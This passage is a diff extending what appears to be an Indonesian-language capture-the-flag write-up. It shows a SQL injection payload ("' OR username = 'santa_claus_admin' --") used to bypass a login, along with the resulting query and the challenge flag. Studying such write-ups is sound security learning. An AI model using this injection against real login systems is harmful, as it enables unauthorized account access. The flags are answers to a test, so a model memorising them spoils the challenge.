@@ -57,4 +57,16 @@ Hello, reindeer! Here is your flag: is_4_g1ft_fr0m_santa!_an
 nah yang terakhir karena limit username nya gak cukup kita bisa
 
 username: `bebas`
-pw: `'`
+pw: ` OR username = 'santa_claus_admin' --`
+
+nanti quary nya akan
+
+```
+SELECT * FROM users WHERE username='bebas' AND password='' OR username = 'santa_claus_admin' --';
+```
+dan flag nya :
+```
+Hello, santa_claus_admin! Here is your flag: d_Happy_N3w_Year_2026!!}
+```
+
+`Final FLAG: d_Happy_N3w_Year_2026!!} `
